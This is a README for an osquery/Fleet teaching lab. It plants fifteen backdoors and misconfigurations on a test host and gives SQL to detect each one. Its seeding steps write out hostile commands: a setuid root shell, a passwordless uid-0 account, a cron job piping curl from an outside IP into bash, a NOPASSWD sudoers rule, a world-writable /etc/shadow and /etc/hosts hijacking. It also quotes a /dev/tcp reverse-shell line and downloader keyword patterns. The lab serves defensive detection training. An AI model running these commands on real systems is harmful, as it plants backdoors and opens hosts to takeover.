# Security-Audit Lab — 10 osquery Detection Scenarios

> **Аудит безопасности / Security-audit teaching demo.**
> This lab boots a **Fleet** server plus one or more **Ubuntu 24.04 osquery
> agents**. When an agent starts with `SEED_VULNS=true`, the script
> [`agent/seed-vulnerabilities.sh`](agent/seed-vulnerabilities.sh) deliberately
> plants ten realistic security problems on that host — backdoor accounts, a
> SUID root shell, rogue services, SSH/cron persistence, a NOPASSWD sudoers
> backdoor, known-vulnerable software and a C2 beacon.
>
> Your job as the auditor: open Fleet → **Queries → Create/Live query**, point it
> at the seeded host, and run the SQL below to surface each finding — exactly as
> you would sweep a real fleet for compromise and misconfiguration. Every query
> is written to return **rows only when the vulnerability is present**, so an
> empty result set means "clean" and a non-empty one is your finding.
>
> All SQL is validated against the **osquery 5.23.0** schema (the version the
> lab agent ships). Copy-paste straight into the Fleet query console.
>
> ⚠️ **FOR ISOLATED TEACHING LABS ONLY. Never run the seed script on a real
> host — it intentionally weakens the machine.**

Each scenario below is detected by a **distinct osquery table / technique** so
the demo teaches breadth:

| # | Scenario | ATT&CK | Primary table |
|---|----------|--------|---------------|
| 1 | SUID backdoor shell | T1548.001 | `suid_bin` |
| 2 | Extra UID 0 / passwordless account | T1136.001, T1548 | `users` (+ `shadow`) |
| 3 | Weak SSHD config | T1098, T1556 | `augeas` |
| 4 | Rogue SSH authorized_keys | T1098.004 | `authorized_keys` |
| 5 | Cron persistence beacon | T1053.003 | `crontab` |
| 6 | Rogue bind-shell port | T1571 | `listening_ports` + `processes` |
| 7 | Process executing from /tmp | T1036.005 | `processes` |
| 8 | NOPASSWD sudoers + weak /etc/shadow | T1548.003, T1222.002 | `sudoers` (+ `file`) |
| 9 | Known-vulnerable software (CVE) | — | `python_packages` |
| 10 | Reverse-shell / C2 beacon | T1571, T1059.004 | `process_open_sockets` |
| 11 | LD_PRELOAD userland rootkit | T1574.006 | `process_envs` |
| 12 | Attacker traces in shell history | T1552.003, T1070.003 | `shell_history` |
| 13 | Fileless: deleted binary still running | T1070.004 | `processes` (`(deleted)`) |
| 14 | `/etc/hosts` hijack of trusted domains | T1565.001, T1556 | `etc_hosts` |
| 15 | Hidden privilege via the `docker` group | T1098, T1548 | `user_groups` + `groups` |

---

## 1. SUID/SGID backdoor shell

**Real-world framing.** *Abuse Elevation Control Mechanism: Setuid and Setgid*
(**MITRE ATT&CK [T1548.001](https://attack.mitre.org/techniques/T1548/001/)**).
Attackers who briefly hold root often plant a setuid-root copy of a shell so any
unprivileged account can later regain root instantly with `rootbash -p` — no
password, no exploit.

**The vulnerability.** `/usr/local/bin/rootbash` is a copy of `/bin/bash` owned
by `root` with the **setuid bit** set (`4755`). Executing it yields a root shell.

**How it's seeded.**
```bash
cp -f /bin/bash /usr/local/bin/rootbash
chown root:root /usr/local/bin/rootbash
chmod 4755 /usr/local/bin/rootbash
```

**Detection query.** `suid_bin` enumerates setuid/setgid binaries; legitimate
ones live in `/bin`, `/usr/bin`, `/usr/sbin`. Anything setuid-root under
`/usr/local` is suspicious:
```sql
SELECT path, username, groupname, permissions
FROM suid_bin
WHERE path LIKE '/usr/local/%'
  AND username = 'root';
```

**Expected result.** One row: `/usr/local/bin/rootbash`, owner `root`,
permissions flagged setuid (`S`).

**Remediation.** `rm /usr/local/bin/rootbash`; audit all SUID binaries
(`find / -perm -4000`), keep an allow-list, and alert on new setuid-root files.

---

## 2. Extra UID 0 account + passwordless login

**Real-world framing.** *Create Account: Local Account*
(**[T1136.001](https://attack.mitre.org/techniques/T1136/001/)**) combined with
account-manipulation persistence. Any account with **uid 0 is root**, regardless
of its name — a favourite stealthy backdoor because it hides in `/etc/passwd`.

**The vulnerability.** A second super-user `sysbackup` with **uid 0 / gid 0** and
an **empty password** (passwordless login permitted) has been added.

**How it's seeded.**
```bash
echo 'sysbackup:x:0:0:System Backup:/root:/bin/bash' >> /etc/passwd
echo 'sysbackup::20000:0:99999:7:::'                 >> /etc/shadow   # empty pw field
```

**Detection query.** Any uid 0 other than `root`:
```sql
SELECT uid, username, description, directory, shell
FROM users
WHERE uid = 0 AND username != 'root';
```
Bonus — find passwordless accounts via `shadow`:
```sql
SELECT username, password_status, hash_alg
FROM shadow
WHERE password_status = 'empty';
```

**Expected result.** `users` returns one row for `sysbackup` (uid 0); `shadow`
returns `sysbackup` with `password_status = 'empty'`.

**Remediation.** `userdel sysbackup` (or remove the `/etc/passwd` line); enforce
that only `root` has uid 0, and forbid empty passwords in PAM/`login.defs`.

---

## 3. Weak SSHD configuration

**Real-world framing.** Weak remote-access config enables *Valid Accounts /
credential-based access* (**[T1098](https://attack.mitre.org/techniques/T1098/)**,
**[T1556](https://attack.mitre.org/techniques/T1556/)**). `PermitRootLogin yes` +
`PasswordAuthentication yes` + `PermitEmptyPasswords yes` invites brute-force and
direct root compromise.

**The vulnerability.** `/etc/ssh/sshd_config` allows password-based root login and
empty passwords — the three most dangerous SSH directives, all on.

**How it's seeded.** The script sets (creating or rewriting each directive):
```bash
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
```

**Detection query.** osquery has no dedicated `sshd_config` table, but the
`augeas` table parses config files structurally (via the Sshd lens). Query the
file path and pick out the risky directives:
```sql
SELECT node, value
FROM augeas
WHERE path = '/etc/ssh/sshd_config'
  AND (
        (node LIKE '%PermitRootLogin'      AND value = 'yes') OR
        (node LIKE '%PasswordAuthentication' AND value = 'yes') OR
        (node LIKE '%PermitEmptyPasswords'   AND value = 'yes')
      );
```

**Expected result.** Up to three rows, one per risky directive set to `yes`
(e.g. `.../PermitRootLogin = yes`). On Ubuntu you'll see all three; on Oracle
Linux the default config already ships a `PasswordAuthentication` line, so augeas
indexes the duplicate as `PasswordAuthentication[1]` / `[2]` and the end-anchored
`LIKE` skips it — you still get `PermitRootLogin` + `PermitEmptyPasswords`, which
is a clear finding.

**Remediation.** Set `PermitRootLogin no`, `PasswordAuthentication no`,
`PermitEmptyPasswords no`; use key-based auth only and `systemctl reload ssh`.

---

## 4. Unauthorized SSH `authorized_keys`

**Real-world framing.** *Account Manipulation: SSH Authorized Keys*
(**[T1098.004](https://attack.mitre.org/techniques/T1098/004/)**). Appending an
attacker-controlled public key to `~/.ssh/authorized_keys` is one of the quietest,
most durable Linux persistence tricks — no new process, no new account.

**The vulnerability.** An attacker Ed25519 key
(`attacker@evil`) sits in `/root/.ssh/authorized_keys`, granting passwordless
root SSH from the attacker's machine.

**How it's seeded.**
```bash
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...  attacker@evil' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Detection query.** The `authorized_keys` table walks every user's home dir; join
`users` to attribute each key to an account:
```sql
SELECT u.username, ak.uid, ak.algorithm, ak.key_file, ak.comment
FROM authorized_keys ak
JOIN users u ON ak.uid = u.uid;
```

**Expected result.** A row for the `root` account showing an `ssh-ed25519` key in
`/root/.ssh/authorized_keys` with comment `attacker@evil`. Compare every returned
key against your known-good inventory — any unrecognised key is the finding.

**Remediation.** Remove the offending line from `authorized_keys`; centralise key
management, and monitor `authorized_keys` files for change.

---

## 5. Cron persistence / download-and-run beacon

**Real-world framing.** *Scheduled Task/Job: Cron*
(**[T1053.003](https://attack.mitre.org/techniques/T1053/003/)**). A cron entry
that pipes `curl` into `bash` re-fetches and runs attacker code on a schedule —
persistence plus a live C2 update channel.

**The vulnerability.** `/etc/cron.d/apache-backup` (innocuous name, malicious
payload) runs `curl … | bash` every 5 minutes as root.

**How it's seeded.**
```bash
cat > /etc/cron.d/apache-backup <<'EOF'
*/5 * * * * root curl -fsSL http://198.51.100.13/b.sh | bash > /dev/null 2>&1
EOF
```

**Detection query.** The `crontab` table parses `/etc/crontab`, `/etc/cron.d/*`
and per-user crontabs. Flag any command that fetches-and-executes:
```sql
SELECT path, minute, hour, command
FROM crontab
WHERE command LIKE '%curl%'
   OR command LIKE '%wget%'
   OR command LIKE '%| bash%'
   OR command LIKE '%/dev/tcp%';
```

**Expected result.** One row from `/etc/cron.d/apache-backup` with the
`curl … | bash` command scheduled `*/5`.

**Remediation.** Delete the cron file; alert on new files in `/etc/cron.d` and on
any cron command invoking a downloader piped to a shell.

---

## 6. Rogue listening service (bind shell)

**Real-world framing.** *Non-Standard Port / bind backdoor*
(**[T1571](https://attack.mitre.org/techniques/T1571/)**). A service bound to
`0.0.0.0:4444` (the archetypal Metasploit port) that isn't part of the host's
role is a classic bind-shell/backdoor listener.

**The vulnerability.** A Python listener holds `0.0.0.0:4444` open, accepting
inbound connections — an unauthorised network entry point.

**How it's seeded.** A small `backdoor-listener.py` is written to
`/usr/local/sbin/` and started detached:
```bash
setsid nohup python3 /usr/local/sbin/backdoor-listener.py &   # binds 0.0.0.0:4444
```

**Detection query.** Join `listening_ports` to `processes` to see *what* is
listening and *which binary* owns the socket:
```sql
SELECT lp.address, lp.port, lp.protocol, p.pid, p.name, p.path, p.cmdline
FROM listening_ports lp
JOIN processes p ON lp.pid = p.pid
WHERE lp.port = 4444;
```
More generally, hunt every listener and eyeball the unexpected ones by removing
the `port = 4444` filter.

**Expected result.** One row: TCP `0.0.0.0:4444` owned by a `python3` process
running `/usr/local/sbin/backdoor-listener.py`.

**Remediation.** Kill the process, remove the script; restrict egress/ingress
with a host firewall and alert on listeners outside the approved service list.

---

## 7. Process executing from a world-writable directory

**Real-world framing.** *Command and Scripting Interpreter / Masquerading:
Match Legitimate Name or Location*
(**[T1036.005](https://attack.mitre.org/techniques/T1036/005/)**). Legitimate
daemons run from `/usr/bin`, `/usr/sbin`, etc. Malware frequently stages in
world-writable `/tmp`, `/dev/shm` or `/var/tmp` and masquerades under a
system-looking name.

**The vulnerability.** A running process executes from
`/tmp/.systemd-private` — a dot-hidden binary in a world-writable dir pretending
to be a systemd helper.

**How it's seeded.**
```bash
cp -f /bin/sleep /tmp/.systemd-private
setsid nohup /tmp/.systemd-private 86400 &
```

**Detection query.** `processes.path` reveals where each running binary lives:
```sql
SELECT pid, name, path, cmdline, uid, start_time
FROM processes
WHERE path LIKE '/tmp/%'
   OR path LIKE '/dev/shm/%'
   OR path LIKE '/var/tmp/%';
```

**Expected result.** One row for the process whose `path` is
`/tmp/.systemd-private`.

**Remediation.** Kill the process and remove the binary; mount `/tmp` and
`/dev/shm` with `noexec,nosuid,nodev`, and alert on execution from
world-writable paths.

---

## 8. NOPASSWD sudoers backdoor + world-writable `/etc/shadow`

**Real-world framing.** *Abuse Elevation Control Mechanism: Sudo and Sudo Caching*
(**[T1548.003](https://attack.mitre.org/techniques/T1548/003/)**) plus *File and
Directory Permissions Modification*
(**[T1222.002](https://attack.mitre.org/techniques/T1222/002/)**). A
`NOPASSWD:ALL` sudo rule is instant password-free root; a world-writable
`/etc/shadow` lets *any* user overwrite password hashes (including root's).

**The vulnerability.** `/etc/sudoers.d/99-backdoor` grants `sysbackup` (the uid-0
account from scenario 2) `ALL=(ALL) NOPASSWD:ALL`, and `/etc/shadow` is mode
`0666` (world-writable) instead of the correct `0640`/`0600`.

**How it's seeded.**
```bash
echo 'sysbackup ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/99-backdoor
chmod 440 /etc/sudoers.d/99-backdoor
chmod 0666 /etc/shadow
```

**Detection query.** The `sudoers` table parses `/etc/sudoers` and its includes:
```sql
SELECT source, header, rule_details
FROM sudoers
WHERE rule_details LIKE '%NOPASSWD%';
```
Companion query — verify sensitive-file permissions via the `file` table (any
mode where "group/other" has write is wrong):
```sql
SELECT path, mode, uid, gid
FROM file
WHERE path = '/etc/shadow'
  AND mode NOT IN ('0640', '0600', '0400', '0000');
```

**Expected result.** `sudoers` returns the `NOPASSWD:ALL` rule for `sysbackup`;
`file` returns `/etc/shadow` with `mode = '0666'`.

**Remediation.** Remove the sudoers drop-in; `chmod 0640 /etc/shadow`
(`root:shadow`); run `visudo -c` and audit `/etc/sudoers.d/`.

---

## 9. Known-vulnerable software (CVE) in inventory

**Real-world framing.** Unpatched dependencies are the most common real-world
exposure. **Django 2.2.0** carries multiple well-known CVEs, e.g.
**CVE-2020-7471** (SQL injection via `StringAgg(delimiter=…)`),
**CVE-2019-14232/14233/14234/14235** (ReDoS / SQLi / deserialization), and
**CVE-2020-9402** (GIS SQLi). Fleet's software inventory feeds its
**Vulnerabilities** view, which maps installed versions to CVEs automatically.

**The vulnerability.** The Python package `Django 2.2.0` is installed — an
end-of-life release with published, exploitable CVEs.

**How it's seeded.** Tries `pip`, and falls back to a synthetic `dist-info` so
the package still shows in inventory **fully offline**:
```bash
pip3 install --break-system-packages 'Django==2.2.0' \
  || (mkdir -p <site-packages>/Django-2.2.0.dist-info \
      && printf 'Metadata-Version: 2.1\nName: Django\nVersion: 2.2.0\n' \
           > <site-packages>/Django-2.2.0.dist-info/METADATA)
```

**Detection query.** `python_packages` inventories installed Python distributions.
The reported version depends on how the fixture was created: a real `pip install`
normalizes `2.2.0` → `2.2` (`dist-info` = `Django-2.2.dist-info`), while the
**offline fallback** writes an explicit `Version: 2.2.0` (`dist-info` =
`Django-2.2.0.dist-info`). Match both with the prefix `LIKE '2.2%'`:
```sql
SELECT name, version, path
FROM python_packages
WHERE name = 'Django' AND version LIKE '2.2%';
```
> **In Fleet:** also open **Host details → Software** and the fleet-wide
> **Vulnerabilities** page — Django 2.2.0 will be listed with its CVE IDs and
> CVSS scores (the vuln feed populates on the `FLEET_VULNERABILITIES_PERIODICITY`
> cycle). The same pattern applies to OS packages via the `deb_packages` table
> (e.g. an old `openssl`/`sudo`) — not seeded here to avoid network downloads,
> but `SELECT name, version FROM deb_packages WHERE name = 'sudo';` is the
> equivalent OS-package query.

**Expected result.** One row: `Django`, version `2.2` (pip path) or `2.2.0`
(offline-fallback path), with its site-packages path. In Fleet's Vulnerabilities
view it resolves to CVE-2020-7471 et al.

**Remediation.** Upgrade Django to a supported, patched release; track SBOM /
dependencies and act on Fleet's Vulnerabilities dashboard.

---

## 10. Reverse-shell / C2 beacon (established outbound connection)

**Real-world framing.** *Non-Standard Port* + *Command and Scripting Interpreter:
Unix Shell* (**[T1571](https://attack.mitre.org/techniques/T1571/)**,
**[T1059.004](https://attack.mitre.org/techniques/T1059/004/)**). A reverse
shell / C2 beacon makes a persistent **outbound** connection to attacker
infrastructure, evading inbound firewall rules.

**The vulnerability.** A `c2-beacon.py` process holds an **ESTABLISHED** outbound
TCP connection to a C2 on port **9001**. (In the lab the C2 is served locally by
`c2-sink.py` so the socket stays up offline; in the wild `remote_address` would be
the attacker's IP.)

**How it's seeded.** A local sink and the outbound beacon, both detached:
```bash
setsid nohup python3 /usr/local/sbin/c2-sink.py   &   # holds 127.0.0.1:9001
setsid nohup python3 /usr/local/sbin/c2-beacon.py &   # connects out to :9001, holds it open
```

**Detection query.** `process_open_sockets` shows per-process connections
including remote endpoint and state; join `processes` for attribution:
```sql
SELECT p.pid, p.name, p.cmdline,
       pos.local_address, pos.local_port,
       pos.remote_address, pos.remote_port, pos.state
FROM process_open_sockets pos
JOIN processes p ON pos.pid = p.pid
WHERE pos.state = 'ESTABLISHED'
  AND pos.remote_port = 9001;
```
> **Why the socket table, not `cmdline`?** A bash `bash -i >& /dev/tcp/HOST/PORT
> 0>&1` reverse shell hides the destination in shell *redirections*, which never
> appear in `processes.cmdline` (argv is just `bash -i`). The outbound socket is
> the reliable signal — that's the teaching point of this scenario.

**Expected result.** A row for the beacon process with `state = 'ESTABLISHED'`
and `remote_port = 9001`. In production, triage every ESTABLISHED connection to
an unexpected `remote_port` / non-RFC1918 `remote_address`.

**Remediation.** Kill the beacon process; enforce egress filtering / allow-list
outbound destinations, and alert on long-lived connections to unusual ports.

---

## 11. LD_PRELOAD userland rootkit / library injection

**Real-world framing.** *Hijack Execution Flow: Dynamic Linker Hijacking*
(**MITRE ATT&CK [T1574.006](https://attack.mitre.org/techniques/T1574/006/)**).
The dynamic linker honours `LD_PRELOAD` — a list of shared objects loaded
**before** every other library. Attackers preload a malicious `.so` to hook libc
calls (`readdir`, `open`, `accept`), hiding files, processes and network sockets,
or skimming credentials. Set persistently in `/etc/ld.so.preload` it hooks *every*
new process on the host; set per-process it hides in that process's environment.

**The vulnerability.** A long-lived process runs with
`LD_PRELOAD=/usr/local/lib/libx86_64.so` in its environment — an injected library
hook. (In the lab the `.so` is an empty benign marker so nothing is actually
hooked; the detectable artefact is the injected env var itself.)

**How it's seeded.**
```bash
: > /usr/local/lib/libx86_64.so                          # marker (real: malicious .so)
env LD_PRELOAD=/usr/local/lib/libx86_64.so python3 -c 'import time
while True: time.sleep(3600)' &                          # victim carries the env var
```

**Detection query.** `process_envs` exposes each process's environment. Any
process carrying a linker-injection variable (`LD_PRELOAD`, `LD_LIBRARY_PATH`,
`LD_AUDIT`) is worth explaining — legitimate ones are rare and well-known:
```sql
SELECT pe.pid, p.name, pe.key, pe.value
FROM process_envs pe
JOIN processes p ON pe.pid = p.pid
WHERE pe.key IN ('LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT')
  AND pe.value != '';
```
Companion query — the host-wide persistence file (should not exist on a clean
box):
```sql
SELECT path, size, mtime FROM file WHERE path = '/etc/ld.so.preload';
```

**Expected result.** One row: a `python3` process with `key = 'LD_PRELOAD'` and
`value = /usr/local/lib/libx86_64.so`. `process_envs` reads `/proc/<pid>/environ`,
so run osquery as root.

**Remediation.** Kill the process; remove any rogue `.so` and delete
`/etc/ld.so.preload` if present; baseline which processes may legitimately set
`LD_*`, and alert on new preload libraries.

---

## 12. Attacker traces in shell history

**Real-world framing.** *Unsecured Credentials: Bash History*
(**[T1552.003](https://attack.mitre.org/techniques/T1552/003/)**) and
*Indicator Removal: Clear Command History*
(**[T1070.003](https://attack.mitre.org/techniques/T1070/003/)**). Hands-on-keyboard
intrusions leave a trail in `~/.bash_history`: download-and-run commands, decoded
payloads, and often a `history -c` at the end — which clears the *live* shell but
not the on-disk file already flushed.

**The vulnerability.** `/root/.bash_history` contains attacker commands — a
`wget` of a "miner", a `base64 -d | bash` payload, a `curl … | bash`, and a
trailing `history -c`.

**How it's seeded.** Suspicious lines are appended to `/root/.bash_history`
(e.g. `wget http://198.51.100.13/miner …`, `echo <b64> | base64 -d | bash`,
`curl -fsSL http://198.51.100.13/b.sh | bash`, `history -c`).

**Detection query.** The `shell_history` table parses users' history files (its
columns are `uid`, `time`, `command`, `history_file`). By default it reads only
the *current* user's history, so **JOIN `users`** to sweep every account and
attribute each command. Hunt for downloader-into-shell, decoded payloads and
history-clearing:
```sql
SELECT u.username, sh.command
FROM shell_history sh
JOIN users u ON sh.uid = u.uid
WHERE sh.command LIKE '%curl%| bash%'
   OR sh.command LIKE '%wget %'
   OR sh.command LIKE '%base64 -d%'
   OR sh.command LIKE '%history -c%'
   OR sh.command LIKE '%/dev/tcp/%';
```

**Expected result.** Several rows for `root`, including the `base64 -d | bash`
payload and the `history -c` clean-up attempt.

**Remediation.** Treat the host as compromised and investigate; ship shell
history to a central log (append-only) so `history -c` can't erase evidence, and
alert on decode-and-execute patterns.

---

## 13. Fileless: a deleted binary still running

**Real-world framing.** *Indicator Removal: File Deletion*
(**[T1070.004](https://attack.mitre.org/techniques/T1070/004/)**). Malware that
copies itself, launches, then `rm`s the on-disk file leaves nothing for a
file-based scan — yet the process keeps running from the now-unlinked inode. The
kernel still resolves `/proc/<pid>/exe` (readlink appends `" (deleted)"`), and
osquery flags the same fact with `processes.on_disk = 0`.

**The vulnerability.** A process runs from `/tmp/.x11-unix-cache` (a
system-looking name in a world-writable directory) whose backing file has been
deleted — a classic "fileless" foothold. (We stage in `/tmp` rather than
`/dev/shm` because the latter is frequently mounted `noexec`; the finding is the
deleted binary, not the directory.)

**How it's seeded.**
```bash
cp /bin/sleep /tmp/.x11-unix-cache
/tmp/.x11-unix-cache 86400 &
rm -f /tmp/.x11-unix-cache        # file gone; the PID lives on
```

**Detection query.** `processes.on_disk` is `0` when a running process's
executable no longer exists on disk (unlinked). `path` still shows where it lived:
```sql
SELECT pid, name, path, cmdline, uid
FROM processes
WHERE on_disk = 0 AND path != '';
```
> **Note.** osquery reports the *original* path in `path` (it does **not** keep
> the readlink `" (deleted)"` suffix) — the deletion is signalled by `on_disk`.
> `on_disk = 0` also flags a process whose binary was legitimately replaced
> (e.g. mid-upgrade), so treat it as a lead to triage, not proof of malice.

**Expected result.** One row: the running process whose backing file
(`/tmp/.x11-unix-cache`) has been deleted, with `on_disk = 0`.

**Remediation.** Kill the process (capture `/proc/<pid>/exe` first for forensics —
the inode is still readable); mount `/dev/shm` and `/tmp` `noexec`; alert on
execution from memory-backed filesystems and on deleted-executable processes.

---

## 14. `/etc/hosts` hijack of trusted domains

**Real-world framing.** *Data Manipulation: Stored Data Manipulation* /
*Modify Authentication Process* (**[T1565.001](https://attack.mitre.org/techniques/T1565/001/)**,
**[T1556](https://attack.mitre.org/techniques/T1556/)**). Because `/etc/hosts`
is consulted **before** DNS, an attacker who pins `security.ubuntu.com` (or an
internal update server) to their own IP silently redirects package updates and
telemetry — serving fake patches or capturing data — with no DNS query to detect.

**The vulnerability.** `/etc/hosts` maps update/security domains
(`security.ubuntu.com`, `archive.ubuntu.com`, `deb.debian.org`) to an
attacker IP `45.137.21.53`.

**How it's seeded.**
```bash
cat >> /etc/hosts <<'EOF'
45.137.21.53  security.ubuntu.com
45.137.21.53  archive.ubuntu.com
45.137.21.53  deb.debian.org
EOF
```

**Detection query.** The `etc_hosts` table parses `/etc/hosts`. A clean host maps
only loopback and its own name; a public FQDN pinned to a routable address is
suspicious. This form excludes loopback and the container's own (non-FQDN)
entries:
```sql
SELECT address, hostnames
FROM etc_hosts
WHERE address NOT LIKE '127.%'
  AND address NOT LIKE '::%'
  AND address NOT LIKE 'fe00%'
  AND address NOT LIKE 'ff0%'
  AND (hostnames LIKE '%.com%' OR hostnames LIKE '%.org%' OR hostnames LIKE '%.net%');
```

**Expected result.** Rows mapping the update/security FQDNs to `45.137.21.53`.

**Remediation.** Remove the rogue lines; keep `/etc/hosts` minimal and
file-integrity-monitored, and alert on any public FQDN pinned to a non-approved
address.

---

## 15. Hidden privilege via the `docker` group

**Real-world framing.** *Account Manipulation*
(**[T1098](https://attack.mitre.org/techniques/T1098/)**) plus *Abuse Elevation
Control Mechanism* (**[T1548](https://attack.mitre.org/techniques/T1548/)**).
Membership in the `docker` group is **root-equivalent**: any member can
`docker run -v /:/host …` and read or write the entire host filesystem. The same
holds for `sudo`/`wheel`, `lxd`, `disk` and `shadow`. Slipping a backdoor account
into one of these groups is a stealthy privilege stash that hides in plain sight —
the account itself looks unprivileged.

**The vulnerability.** A low-privileged-looking account `svcagent` (uid ≥ 1000,
ordinary shell) is a member of the `docker` group — silent host root.

**How it's seeded.**
```bash
useradd -m -s /bin/bash svcagent
groupadd docker 2>/dev/null || true
usermod -aG docker svcagent
```

**Detection query.** Join `user_groups` to `users` and `groups` to list members
of root-equivalent groups that a clean host leaves empty (`docker`, `lxd`,
`disk`, `shadow`):
```sql
SELECT u.username, u.uid, g.groupname
FROM user_groups ug
JOIN users u  ON ug.uid = u.uid
JOIN groups g ON ug.gid = g.gid
WHERE g.groupname IN ('docker', 'lxd', 'disk', 'shadow')
  AND u.username != 'root';
```
> **Also review `sudo`/`wheel`/`adm`** — those grant admin too, but a normal host
> *legitimately* has your administrator in them (e.g. the default `ubuntu`
> account), so listing them isn't an anomaly by itself. Swap the group list above
> to `('sudo', 'wheel', 'adm')` and reconcile every member against your known-good
> admin roster; the query kept for the automated sweep uses the groups that
> should be **empty**, so any row is a finding.

**Expected result.** One row: `svcagent` in the `docker` group. Every returned
member should map to a known administrator — anyone else is the finding.

**Remediation.** `gpasswd -d svcagent docker` (and delete the account if
unrecognised); review membership of every root-equivalent group, and alert on
additions to them.

---

## Running the whole sweep

Paste any query above into **Fleet → Queries → Live query**, target the seeded
host, and **Run**. A quick triage order for an audit: 2 → 1 → 8 → 15 (privilege &
accounts) → 4 → 3 → 5 → 14 (persistence & config) → 11 (injection) → 6 → 10
(network) → 7 → 13 (execution) → 12 (forensics) → 9 (patching). Empty result =
clean for that check; any rows = investigate.

> **Fleet-wide hunt.** The lab also boots several **clean** agents. Run any query
> above with **no host filter** (target *all hosts*): only the seeded `vuln-agent`
> lights up while the clean hosts return nothing — exactly how you'd sweep a real
> fleet and let the compromised needle surface from the haystack.
